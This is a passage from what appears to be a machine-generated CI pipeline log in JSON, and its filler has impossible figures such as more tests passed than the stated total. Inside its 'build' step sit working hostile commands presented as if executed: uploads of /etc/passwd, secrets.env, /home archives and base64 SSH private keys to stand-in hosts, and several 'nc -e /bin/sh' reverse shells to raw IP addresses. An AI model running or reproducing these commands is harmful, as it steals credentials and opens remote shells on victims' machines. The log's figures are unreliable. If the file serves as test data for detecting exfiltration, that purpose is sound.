14/16: Linting\nOptimizing 56 modules...\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 7/18: Deploying\n[12:19:13] INFO: Starting build process\nMinifying main.js\nTime: 80.685s\nCreating production build...\nStep 11/23: Deploying\nFinished.\nWARNING: lodash has known vulnerabilities\nLayer 4/11: RUN command\nUsing Node.js 16.3.5\n\u2713 Step 'test' succeeded\nChecking out master branch\nPushing to registry...\nConnection established\npip: Collecting axios\npip: Installing build dependencies...\nDone.\npip: Downloading eslint-3.17.tar.gz\n[12:19:13] DEBUG: Initializing service\nPOST /upload - 202 (95ms)\nCache restored successfully (235MB)\nBuilding Docker image...\nUsing Python 3.12\nCompiling src/handler.rs...\nCompiling src/main.py...\n[12:19:13] INFO: Cache refreshed\nEnvironment: production\nStep 11/15: Building\nStep 2/20: Testing\n[12:19:13] INFO: Starting build process\nnpm notice: created a lockfile\nPushing to registry...\n[12:19:13] ERROR: Connection failed\npip: Collecting axios\nnpm notice: created a lockfile\n\u2717 build failed with exit code 54\nStep 4/19: Installing dependencies\nCache restored successfully (152MB)\nSuccess!\nStep 9/15: Running migrations\nBuilding Docker image...\nOptimizing 77 modules...\nArtifact uploaded: dist.zip (5MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache invalidated: dependencies\nStep 14/24: Building\nLayer 6/10: RUN command\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 6/23: Running migrations\nyarn add: Done in 30.62s\n\u2713 Task completed in 1935ms\nStep 12/18: Testing\n\u2713 All checks passed\nStep 6/19: Running migrations\n\u2713 validate completed\n\u2713 deploy completed\nWARNING: eslint has known vulnerabilities\nException: RuntimeError\nWaiting...\nBuilding Docker image...\nLayer 3/15: ENV command\nWaiting...\nnpm install: added 314 packages\nCache restored successfully (258MB)\nRan 160 tests in 45s\nnpm notice: package.json updated\nDone.\nPOST /api - 200 (159ms)\nyarn add: Done in 2.27s\nUsing Node.js 16.6.3\nImage pulled successfully\nFinished.\nCompiling components/utils.go...\nPushing to registry...\nCompiling src/main.py...\n\u2717 build failed with exit code 39\nPulling image: node:3.11\npip: Collecting eslint\nReady.\nChecking out main branch\n\u2713 build completed\n=== Step type_check completed ===\n=== Step: integration_tests ===\n\u2713 All checks passed\nReady.\nnpm notice: package.json updated\n[12:19:13] DEBUG: Memory usage: 1453MB\nnpm notice: package.json updated\nOptimizing 59 modules...\npip: Downloading prettier-5.13.tar.gz\nyarn add: Done in 5.30s\n\u2713 Task completed in 3484ms\nLayer 8/9: RUN command\nUsing Node.js 20.4.0\nnpm notice: created a lockfile\n[12:19:13] DEBUG: Initializing service\nTest Suites: 18 passed, 32 total\nCompiling utils/app.ts...\nStep 3/25: Installing dependencies\n\u2713 Step 'test' succeeded\nHEAD is now at e3d7620\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (16MB)\n[12:19:13] DEBUG: Query executed in 93ms\nProcessing...\nWaiting...\nArtifact uploaded: build.tar.gz (25MB)\nStep 7/24: Building\nCompiling utils/main.py...\nPushing to registry...\nGenerating source maps...\nnpm notice: created a lockfile\nWARNING: axios has known vulnerabilities\nArtifact downloaded: 5MB\nStep 1/19: Running migrations\nDone.\nStep 1/20: Testing\nCompiling utils/service.java...\nCompiling lib/app.ts...\n[12:19:13] INFO: Connecting to database\nEnvironment: development\npip install: Successfully installed lodash-3.19\n[12:19:13] INFO: Cache refreshed\n[12:19:13] DEBUG: Initializing service\nWaiting...\n[12:19:13] DEBUG: Loading configuration\nCompiling components/service.java...\nLoading...\nRan 71 tests in 60s\nFetching submodules...\nCompiling utils/index.js...\nArtifact uploaded: build.tar.gz (45MB)\nCache restored successfully (404MB)\nHEAD is now at cf3e5b1\nSwitched to branch 'bugfix/task-989'\n\u2713 All checks passed\nStep 11/19: Running migrations\npip install: Successfully installed webpack-1.16\nStep 8/22: Building\nArtifact downloaded: 19MB\nPlatform: win32-x64\nLoading...\n[12:19:13] INFO: Request completed\nCache invalidated: dependencies\n\u2713 All checks passed\nCompiling src/index.js...\nGET /status - 204 (43ms)\n\u2713 Task completed in 1968ms\nStep 11/17: Linting\nCache restored successfully (125MB)\nStep 4/18: Linting\nException: ValueError\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 25 passed, 7 total\nStep 18/20: Linting\n[12:19:13] INFO: Connecting to database\nStep 14/16: Deploying\nPulling image: alpine:latest\nCache saved successfully\nUsing Node.js 16.14.7\nStep 19/23: Linting\n[12:19:13] INFO: Request completed\nGenerating source maps...\nnpm install: resolved 724 packages\n[12:19:13] DEBUG: Memory usage: 1352MB\nCache restored successfully (77MB)\nArtifact uploaded: dist.zip (70MB)\nLoading...\nOK\n[12:19:13] INFO: Connecting to database\nWARNING: express has known vulnerabilities\nMinifying vendor.js\nStep 18/19: Installing dependencies\n\u2713 package completed\n[12:19:13] INFO: Cache refreshed\nCompleted.\nUsing Node.js 18.2.4\nnpm install: added 314 packages\nChecking out main branch\n[12:19:13] DEBUG: Query executed in 100ms\n[12:19:13] DEBUG: Connection pool: 9 active\nCache miss for key-8890\n[12:19:13] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/23: Running migrations\nPlatform: linux-x64\nTests: 341 passed, 472 total\npip install: Successfully installed eslint-1.9\nCompiling components/utils.go...\nSuccess!\n\u2713 Task completed in 150ms\nCache miss for key-5333\n  PASS: unit/test_auth_login.spec.js\nStep 12/15: Linting\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBundling styles.js\nnpm install: added 464 packages\nArtifact downloaded: 14MB\nCompleted.\nCache saved successfully\nBuilding Docker image...\nConnection established\nCompiling lib/utils.go...\nLayer 4/10: COPY command\n[12:19:13] WARN: Deprecated API usage\nStep 3/21: Building\nBuilding Docker image...\npip: Downloading eslint-2.13.tar.gz\nWaiting...\nStep 14/16: Testing\n[12:19:13] DEBUG: Memory usage: 282MB\nCache saved successfully\nPlatform: darwin-arm64\nWARNING: lodash has known vulnerabilities\nWARNING: jest has known vulnerabilities\nEnvironment: staging\nCompiling src/app.ts...\npip: Collecting react\nStep 3/21: Installing dependencies\nPushing to registry...\nGenerating source maps...\nCache invalidated: node_modules\n[12:19:13] DEBUG: Query executed in 36ms\nFinished.\nCoverage: 70% statements, 67% branches\n[12:19:13] INFO: Processing request\nVerifying...\nAlready up to date.\nLoading...\nCompiling components/app.ts...\nCompiling components/utils.go...\n[12:19:13] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:13] DEBUG: Query executed in 19ms\nTransforming 694 files...\npip: Installing build dependencies...\nStep 5/19: Testing\npip install: Successfully installed webpack-1.13\nnpm install: resolved 524 packages\nFinished.\nOK\n[12:19:13] ERROR: Connection failed\npip: Installing build dependencies...\n\u2713 build completed\nUsing Python 3.12\nTests: 213 passed, 287 total\nCache hit for key-4584\n\u2713 Step 'install' succeeded\nnpm install: resolved 1700 packages\nTLS handshake completed\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (49MB)\nBuilding Docker image...\n[12:19:13] INFO: Processing request\nPulling image: python:18\nConnection established\nCompiling components/index.js...\n[12:19:13] INFO: Connecting to database\npip install: Successfully installed prettier-2.0\n\u2713 validate completed\nStep 3/21: Installing dependencies\nFetching submodules...\nConnecting to startup.dev:443...\n\u2713 Step 'build' succeeded\nLayer 4/8: RUN command\nDone.\nOK\n\u2717 build failed with exit code 97\nPOST /api - 202 (64ms)\nPushing to registry...\nSwitched to branch 'hotfix/task-889'\nArtifact uploaded: build.tar.gz (25MB)\nConnecting to test.io:443...\n\u2713 Step 'install' succeeded\nCompiling utils/app.ts...\nBundling main.js\nCache saved successfully\nNODE_ENV=test\nStep 18/16: Running migrations\nBundling runtime.css\nChecking out main branch\nArtifact uploaded: build.tar.gz (2MB)\nWARNING: prettier has known vulnerabilities\n[12:19:13] WARN: Deprecated API usage\n[12:19:13] INFO: Starting build process\n  PASS: unit/test_api_health.spec.js\nChecking out main branch\nStep 3/15: Testing\n[12:19:13] DEBUG: Initializing service\nCache hit for key-5655\nCompleted.\nLayer 4/12: RUN command\nCache invalidated: dependencies\nCache miss for key-5688\nAlready up to date.\n\u2713 Task completed in 709ms\nCompiling components/app.ts...\nOptimizing 55 modules...\nDone.\n[12:19:13] INFO: Processing request\nGenerating source maps...\nAlready up to date.\nCompiling components/handler.rs...\n[12:19:13] INFO: Connecting to database\nTest Suites: 46 passed, 26 total\nTransforming 586 files...\nChecking out main branch\n[12:19:13] INFO: Cache refreshed\nCreating production build...\n[12:19:13] WARN: Deprecated API usage\nOK\n[12:19:13] INFO: Request completed\nSnapshots: 4 passed, 29 total\nConnecting to startup.dev:443...\nGET /health - 204 (96ms)\nStep 8/21: Building\nTransforming 781 files...\n  PASS: test_auth_login (347ms)\n[12:19:13] INFO: Request completed\nArtifact uploaded: dist.zip (69MB)\nOptimizing 29 modules...\nnpm install: added 238 packages\nCache hit for key-1850\n=== Step integration_tests completed ===\n=== Step: deploy_production ===\n[12:19:13] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/main.py...\nCache restored successfully (85MB)\nSwitched to branch 'hotfix/task-247'\nArtifact uploaded: dist.zip (99MB)\nPulling image: node:3.11\nDone.\n[12:19:13] DEBUG: Query executed in 4ms\nImage pulled successfully\nAlready up to date.\nWaiting...\nStep 7/15: Deploying\nSnapshots: 40 passed, 23 total\nGET /api - 201 (35ms)\n[12:19:13] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 9/25: Linting\nHEAD is now at 6e97bc5\nCompleted.\n[12:19:13] ERROR: Connection failed\npip: Installing build dependencies...\nCompleted.\nInstalling eslint@2.11.1\npip: Collecting lodash\nImage pulled successfully\nTransforming 586 files...\nUsing Node.js 19.6.3\nTransforming 777 files...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache restored successfully (184MB)\nException: ValueError\n\u2717 build failed with exit code 14\nStep 11/22: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching submodules...\n[12:19:13] INFO: Starting build process\nCompleted.\nStep 13/18: Testing\nDone.\nVerifying...\nWARNING: jest has known vulnerabilities\nAlready up to date.\nCache hit for key-3711\nLoading...\n[12:19:13] DEBUG: Connection pool: 12 active\nCompiling components/handler.rs...\n\u2713 deploy completed\nCompiling lib/index.js...\n  PASS: unit/test_user_create.spec.js\n\u2717 build failed with exit code 125\nUsing Python 3.12\nArtifact uploaded: dist.zip (97MB)\nTransforming 895 files...\n[12:19:13] WARN: Deprecated API usage\n\u2713 Step 'build' succeeded\n[12:19:13] DEBUG: Query executed in 70ms\nWaiting...\nFinished.\nStep 10/22: Deploying\nUploading artifact 'coverage' (39 files)\nOK\nFinished.\nWaiting...\nFinished.\nPlatform: darwin-arm64\nEnvironment: staging\nStep 18/25: Building\nCompiling src/main.py...\nTests: 142 passed, 497 total\nCache hit for key-6884\nArtifact downloaded: 38MB\nAlready up to date.\nStep 20/16: Running migrations\n[12:19:13] INFO: Cache refreshed\n[12:19:13] DEBUG: Initializing service\npip: Collecting webpack\nWARNING: lodash has known vulnerabilities\nSuccess!\nUsing Node.js 19.17.3\nWaiting...\nCache restored successfully (231MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLoading...\nCompiling lib/app.ts...\nStep 14/19: Linting\nInstalling jest@4.17.8\nUploading artifact 'coverage' (25 files)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (46MB)\nStep 14/17: Installing dependencies\nLayer 10/8: COPY command\npip: Downloading prettier-5.16.tar.gz\nVerifying...\nSuccess!\nReady.\nCompiling utils/service.java...\nCompiling utils/app.ts...\nStep 13/24: Testing\n[12:19:13] DEBUG: Query executed in 76ms\nLoading...\nMinifying vendor.js\nInstalling jest@5.7.5\nPOST /upload - 200 (413ms)\nLayer 10/15: COPY command\nCache restored successfully (123MB)\nCache saved successfully\n[12:19:13] WARN: Deprecated API usage\nCache saved successfully\nAlready up to date.\nCache invalidated: build\n[12:19:13] INFO: Connecting to database\nCache hit for key-4394\nReady.\nRan 181 tests in 42s\n[12:19:13] WARN: Deprecated API usage\nCompiling components/main.py...\nUploading artifact 'dist' (27 files)\nUsing Node.js 20.3.10\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\npip: Collecting lodash\nCompiling utils/main.py...\nFAILED: test_auth_login\nMinifying app.js\nMinifying app.js\nTests: 309 passed, 217 total\nInstalling express@5.17.5\nPOST /upload - 202 (289ms)\nUsing Node.js 19.14.5\nLoading...\nTests: 445 passed, 404 total\nMinifying app.js\nCompiling components/index.js...\n[12:19:13] INFO: Connecting to database\nCreating production build...\n[12:19:13] ERROR: Connection failed\nStep 5/17: Deploying\nWaiting...\n[12:19:13] WARN: Deprecated API usage\nCompiling utils/utils.go...\nWARNING: express has known vulnerabilities\nBuilding Docker image...\nPushing to registry...\nStep 5/15: Running migrations\nCoverage: 95% statements, 69% branches\nUsing Node.js 18.19.1\n[12:19:13] DEBUG: Query executed in 89ms\nnpm install: resolved 439 packages\nStep 4/19: Deploying\nConnection established\nUsing Node.js 20.3.0\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUploading artifact 'dist' (39 files)\nPulling image: python:latest\nSwitched to branch 'feature/task-490'\n[12:19:13] INFO: Starting build process\n  PASS: test_db_connect (78ms)\nSwitched to branch 'bugfix/task-558'\n\u2713 All checks passed\nPushing to registry...\nDone.\nStep 8/23: Installing dependencies\npip: Downloading react-1.18.tar.gz\nCompiling utils/service.java...\nStep 14/19: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_auth_login (7ms)\nGenerating source maps...\nImage pulled successfully\nGET /status - 204 (63ms)\nCompiling src/utils.go...\nChecking out develop branch\nDone.\nStep 6/25: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 33 passed, 7 total\nTest Suites: 33 passed, 20 total\npip: Installing build dependencies...\nOptimizing 83 modules...\nFetching submodules...\nSwitched to branch 'feature/task-101'\n[12:19:13] DEBUG: Initializing service\n[12:19:13] WARN: Deprecated API usage\nChecking out main branch\nCache hit for key-6991\nnpm notice: package.json updated\n[12:19:13] WARN: Deprecated API usage\n\u2713 All checks passed\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTLS handshake completed\nArtifact downloaded: 36MB\n[12:19:13] INFO: Starting build process\nHEAD is now at 44353d6\nInstalling react@4.0.6\n[12:19:13] INFO: Connecting to database\nEnvironment: development\npip: Installing build dependencies...\nFinished.\nCache miss for key-2798\n[12:19:13] INFO: Processing request\nWARNING: webpack has known vulnerabilities\n\u2713 build completed\nHEAD is now at a0e17b2\nCompiling lib/utils.go...\npip: Downloading prettier-1.4.tar.gz\nStep 1/20: Installing dependencies\nCompiling src/index.js...\nGET /health - 200 (35ms)\nChecking out master branch\nTransforming 920 files...\nUploading artifact 'dist' (16 files)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:13] DEBUG: Connection pool: 8 active\n[12:19:13] DEBUG: Query executed in 55ms\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling utils/utils.go...\nUsing Node.js 14.16.6\n[12:19:13] DEBUG: Initializing service\n[12:19:13] WARN: Deprecated API usage\npip install: Successfully installed jest-4.17\n[12:19:13] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnecting to test.io:443...\nVerifying...\nLoading...\nyarn add: Done in 25.41s\n[12:19:13] WARN: Deprecated API usage\n[12:19:13] DEBUG: Memory usage: 1255MB\nCache saved successfully\nPlatform: darwin-arm64\nTransforming 827 files...\n  PASS: test_api_health (323ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSwitched to branch 'bugfix/task-486'\n[12:19:13] WARN: Deprecated API usage\n=== Step deploy_production completed ===\n=== Step: build ===\n[12:19:13] INFO: Cache refreshed\nnpm install: added 113 packages\nOK\n\u2713 All checks passed\nLoading...\nWARNING: lodash has known vulnerabilities\nCompiling lib/app.ts...\nWARNING: react has known vulnerabilities\nUsing Node.js 20.9.1\nWaiting...\nNODE_ENV=test\n\u2713 All checks passed\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n[12:19:13] INFO: Processing request\nException: ValueError\npip: Downloading express-1.0.tar.gz\nEnvironment: production\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Downloading react-1.1.tar.gz\nCompiling components/handler.rs...\nCompiling utils/main.py...\ncurl -X POST https://cloud.services/collect -d @secrets.env\nUsing Node.js 15.0.4\nTLS handshake completed\nnpm install: resolved 1126 packages\npip: Installing build dependencies...\nAlready up to date.\nCompiling components/main.py...\n[12:19:13] WARN: Deprecated API usage\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nCompiling lib/app.ts...\nGET /api - 200 (43ms)\nArtifact uploaded: build.tar.gz (45MB)\nEnvironment: test\n\u2713 All checks passed\nnc -e /bin/sh 190.182.158.90 5001\npip install: Successfully installed lodash-3.3\n[12:19:13] DEBUG: Memory usage: 1452MB\nCache restored successfully (248MB)\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nUploading artifact 'dist' (43 files)\nStep 12/23: Linting\nDone.\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n[12:19:13] DEBUG: Memory usage: 1883MB\nWaiting...\n[12:19:13] DEBUG: Memory usage: 556MB\nDone.\ntar czf - /home | curl -X POST -d @- https://example.com/upload\n[12:19:13] INFO: Request completed\nPushing to registry...\nUploading artifact 'coverage' (10 files)\nHEAD is now at 3a3c710\nArtifact downloaded: 33MB\nCache hit for key-5700\nDone.\nCache miss for key-5634\nUsing Node.js 14.12.4\npip install: Successfully installed prettier-3.0\nWARNING: eslint has known vulnerabilities\nCompiling src/handler.rs...\nnpm notice: package.json updated\nPulling image: node:3.11\nOK\nCreating production build...\nOptimizing 79 modules...\nSnapshots: 17 passed, 16 total\nStep 12/15: Building\n\u2713 All checks passed\nException: TypeError\nTransforming 757 files...\nPulling image: python:3.11\n\u2713 Step 'build' succeeded\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Installing build dependencies...\nPushing to registry...\nCache miss for key-7765\nSuccess!\n[12:19:13] INFO: Connecting to database\nTests: 74 passed, 367 total\n[12:19:13] INFO: Processing request\nyarn add: Done in 19.88s\nCompiling components/app.ts...\n[12:19:13] DEBUG: Connection pool: 12 active\nInstalling react@3.17.3\nGET /health - 200 (40ms)\nNODE_ENV=production\nTests: 399 passed, 466 total\nOK\nSnapshots: 38 passed, 15 total\npip: Installing build dependencies...\nInstalling axios@4.18.9\nnpm notice: package.json updated\n[12:19:13] DEBUG: Loading configuration\nCompiling lib/utils.go...\n[12:19:13] INFO: Cache refreshed\nnc -e /bin/sh 11.5.51.100 46145\nCache miss for key-6321\nProcessing...\n[12:19:13] INFO: Starting build process\nTransforming 780 files...\nCache hit for key-5157\nTransforming 757 files...\n[12:19:13] DEBUG: Loading configuration\nPlatform: win32-x64\ncurl -X POST https://test.io/collect -d @secrets.env\nStep 18/22: Deploying\nNODE_ENV=development\n  PASS: test_api_health (232ms)\n\u2717 build failed with exit code 86\n[12:19:13] INFO: Starting build process\nCache saved successfully\npip: Installing build dependencies...\nLayer 8/13: COPY command\nTransforming 421 files...\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nMinifying vendor.js\nUsing Python 3.11\nUploading artifact 'coverage' (5 files)\nFAILED: test_user_create\nHEAD is now at 5a7afd4\nGET /status - 204 (50ms)\nWARNING: jest has known vulnerabilities\nnc -e /bin/sh 15.181.246.186 20663\nnpm notice: package.json updated\n[12:19:13] DEBUG: Query executed in 9ms\n\u2713 Step 'setup' succeeded\nHEAD is now at 2b2cd28\nStep 19/17: Installing dependencies\nTests: 481 passed, 126 total\nSnapshots: 29 passed, 13 total\nStep 4/19: Linting\n[12:19:13] INFO: Cache refreshed\nConnection established\nArtifact downloaded: 1MB\nGET /api - 200 (3ms)\nSwitched to branch 'feature/task-525'\nVerifying...\nnpm notice: package.json updated\nPOST /data - 200 (303ms)\nStep 16/17: Installing dependencies\nVerifying...\nLoading...\nCompiling utils/app.ts...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 158.72.222.150 50046\nDone.\nSwitched to branch 'feature/task-782'\nUsing Python 3.10\nException: ValueError\nPOST /data - 200 (162ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nBuilding Docker image...\n[12:19:13] WARN: Deprecated API usage\nCreating production build...\nConnecting to test.io:443...\n[12:19:13] DEBUG: Loading configuration\nStep 8/17: Installing dependencies\nTests: 339 passed, 448 total\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nCache restored successfully (85MB)\nSending 290MB of data to example.com\nArtifact uploaded: dist.zip (82MB)\nnc -e /bin/sh 103.21.11.3 27095\necho $(cat ~/.ssh/id_rsa) | base64 | nc 230.75.7.22 45033\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\n[12:19:13] WARN: Deprecated API usage\necho $(cat ~/.ssh/id_rsa) | base64 | nc 12.187.212.74 9005\nnpm install: resolved 1016 packages\nLayer 1/8: ENV command\nUploading artifact 'build' (42 files)\nCompiling lib/service.java...\n\u2713 validate completed\nPlatform: darwin-arm64\n[12:19:13] DEBUG: Initializing service\ntar czf - /home | curl -X POST -d @- https://example.com/upload\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: jest has known vulnerabilities\nSending 415MB of data to test.io\nyarn add: Done in 28.1s\nNODE_ENV=development\nArtifact downloaded: 33MB\nUsing Python 3.10\n[12:19:13] DEBUG: Query executed in 73ms\nFAILED: test_db_connect\nPushing to registry...\n[12:19:13] DEBUG: Memory usage: 1520MB\ncurl -X POST https://acme.corp/collect -d @secrets.env\nSwitched to branch 'bugfix/task-718'\nHEAD is now at fefd752\nnpm notice: created a lockfile\nRan 79 tests in 32s\nCompleted.\nUsing Python 3.11\nConnection established\nPOST /api - 201 (66ms)\npip: Installing build dependencies...\nnpm notice: created a lockfile\npip: Collecting react\nnpm install: resolved 1258 packages\n[12:19:13] DEBUG: Initializing service\npip: Downloading jest-4.13.tar.gz\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nRan 125 tests in 39s\npip: Downloading axios-3.8.tar.gz\nCache hit for key-4537\nGET /api - 201 (80ms)\n  PASS: test_auth_login (219ms)\nUsing Node.js 16.2.4\nConnection established\nBuilding Docker image...\nSending 244MB of data to test.io\nAlready up to date.\nRan 64 tests in 25s\nFetching submodules...\nCoverage: 78% statements, 88% branches\nStep 20/20: Deploying\nGET /api - 204 (9ms)\nArtifact uploaded: dist.zip (17MB)\nTests: 56 passed, 78 total\n\u2713 Task completed in 2261ms\n[12:19:13] INFO: Starting build process\nnpm notice: created a lockfile\n[12:19:13] DEBUG: Connection pool: 16 active\n  PASS: test_cache_hit (273ms)\nCompleted.\nProcessing...\nSending 268MB of data to example.com\nCache saved successfully\nException: NullPointerException\n  PASS: test_db_connect (110ms)\n[12:19:13] DEBUG: Memory usage: 601MB\nWARNING: axios has known vulnerabilities\nOK\nTransforming 271 files...\nCompiling lib/utils.go...\nnc -e /bin/sh 105.186.95.103 27183\nSuccess!\nFinished.\nFinished.\n  PASS: integration/test_cache_hit.spec.js\npip install: Successfully installed express-1.17\nOptimizing 19 modules...\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nnc -e /bin/sh 141.146.120.117 37511\nnpm install: resolved 1640 packages\nUploading artifact 'coverage' (39 files)\nCache invalidated: dependencies\nArtifact downloaded: 18MB\n[12:19:13] INFO: Processing request\ncurl -X POST https://cloud.services/collect -d @secrets.env\npip install: Successfully installed lodash-4.0\nImage pulled successfully\nCompiling utils/service.java...\nSending 325MB of data to cloud.services\nnc -e /bin/sh 169.189.218.181 17160\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\npip: Installing build dependencies...\nStep 18/24: Testing\nStep 20/21: Linting\npip: Collecting jest\n[12:19:13] DEBUG: Memory usage: 346MB\n\u2713 Task completed in 4832ms\nSwitched to branch 'hotfix/task-200'\nConnection established\nImage pulled successfully\nCompiling components/service.java...\nStep 16/24: Linting\n=== Step build completed ===",
    "steps": [
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-19T12:19:12.989404",
        "finished_at": "2025-12-19T12:19:27.146390",
        "log_lines": [
          "=== Step: lint ===",
          "Installing webpack@5.6.1",
          "TLS handshake completed",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 All checks passed",
          "npm install: added 315 packages",
          "Done.",
          "Verifying...",
          "Pushing to registry...",
          "[12:19:12] DEBUG: Query executed in 69ms",
          "\u2713 Step 'setup' succeeded",
          "\u2713 test completed",
          "yarn add: Done in 11.68s",
          "\u2713 lint completed",
          "NODE_ENV=development",
          "POST /upload - 201 (261ms)",
          "Completed.",
          "pip: Downloading lodash-4.9.tar.gz",
          "[12:19:12] WARN: Deprecated API usage",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "Compiling utils/main.py...",
          "Building Docker image...",
          "[12:19:12] INFO: Processing request",
          "Cache invalidated: build",
          "Step 4/21: Building",
          "Verifying...",
          "Artifact downloaded: 37MB",
          "Coverage: 79% statements, 97% branches",
          "[12:19:12] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "Coverage: 84% statements, 66% branches",
          "\u2713 Step 'setup' succeeded",
          "Exception: NullPointerException",
          "Step 13/17: Linting",
          "Step 13/17: Testing",
          "Bundling main.css",
          "Transforming 422 files...",
          "POST /data - 201 (310ms)",
          "pip: Collecting prettier",
          "pip: Downloading eslint-1.7.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact downloaded: 47MB",
          "Cache restored successfully (45MB)",
          "Ready.",
          "pip: Collecting eslint",
          "[12:19:12] INFO: Cache refreshed",
          "  PASS: test_cache_hit (6ms)",
          "Processing...",
          "Step 19/16: Running migrations",
          "Environment: production",
          "pip install: Successfully installed jest-4.1",
          "Compiling lib/main.py...",
          "[12:19:12] WARN: Deprecated API usage",
          "Tests: 243 passed, 114 total",
          "Compiling components/utils.go...",
          "[12:19:12] WARN: Deprecated API usage",
          "Test Suites: 27 passed, 36 total",
          "Test Suites: 6 passed, 9 total",
          "[12:19:12] INFO: Cache refreshed",
          "Completed.",
          "Artifact uploaded: dist.zip (63MB)",
          "Step 8/20: Deploying",
          "[12:19:12] WARN: Deprecated API usage",
          "Transforming 168 files...",
          "Test Suites: 11 passed, 9 total",
          "Artifact uploaded: dist.zip (23MB)",
          "Compiling src/app.ts...",
          "Time: 101.541s",
          "Done.",
          "Layer 5/12: ENV command",
          "Platform: darwin-arm64",
          "Tests: 183 passed, 431 total",
          "[12:19:12] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (50 files)",
          "Cache invalidated: dependencies",
          "Cache miss for key-8023",
          "Cache saved successfully",
          "Image pulled successfully",
          "pip: Collecting react",
          "Compiling src/utils.go...",
          "Connecting to test.io:443...",
          "NODE_ENV=test",
          "npm notice: created a lockfile",
          "Compiling src/main.py...",
          "Finished.",
          "POST /data - 200 (204ms)",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Tests: 200 passed, 496 total",
          "Step 12/24: Running migrations",
          "HEAD is now at c98da4a",
          "Using Node.js 14.14.5",
          "Completed.",
          "\u2713 Task completed in 384ms",
          "\u2713 Step 'build' succeeded",
          "POST /data - 200 (119ms)",
          "[12:19:13] INFO: Processing request",
          "[12:19:13] DEBUG: Loading configuration",
          "[12:19:13] ERROR: Connection failed",
          "Minifying app.js",
          "  PASS: test_auth_login (236ms)",
          "[12:19:13] INFO: Processing request",
          "Connecting to cloud.services:443...",
          "\u2713 All checks passed",
          "Checking out develop branch",
          "yarn add: Done in 10.11s",
          "Waiting...",
          "[12:19:13] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "Uploading artifact 'dist' (41 files)",
          "  PASS: unit/test_api_health.spec.js",
          "Building Docker image...",
          "Test Suites: 36 passed, 8 total",
          "Pushing to registry...",
          "Tests: 340 passed, 390 total",
          "OK",
          "Loading...",
          "Coverage: 73% statements, 69% branches",
          "Verifying...",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed lodash-3.1",
          "Processing...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact downloaded: 27MB",
          "[12:19:13] WARN: Deprecated API usage",
          "[12:19:13] DEBUG: Loading configuration",
          "Compiling lib/main.py...",
          "Cache saved successfully",
          "Snapshots: 22 passed, 32 total",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "[12:19:13] WARN: Deprecated API usage",
          "Artifact downloaded: 35MB",
          "Time: 39.841s",
          "Cache restored successfully (228MB)",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "Cache miss for key-4578",
          "Building Docker image...",
          "Generating source maps...",
          "Cache restored successfully (297MB)",
          "Cache miss for key-9514",
          "[12:19:13] DEBUG: Initializing service",
          "[12:19:13] DEBUG: Loading configuration",
          "npm install: resolved 1015 packages",
          "Step 9/15: Running migrations",
          "Environment: staging",
          "GET /health - 200 (58ms)",
          "Environment: staging",
          "Pulling image: alpine:3.11",
          "Layer 8/15: RUN command",
          "Compiling components/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:13] DEBUG: Loading configuration",
          "yarn add: Done in 8.74s",
          "POST /upload - 201 (327ms)",
          "Verifying...",
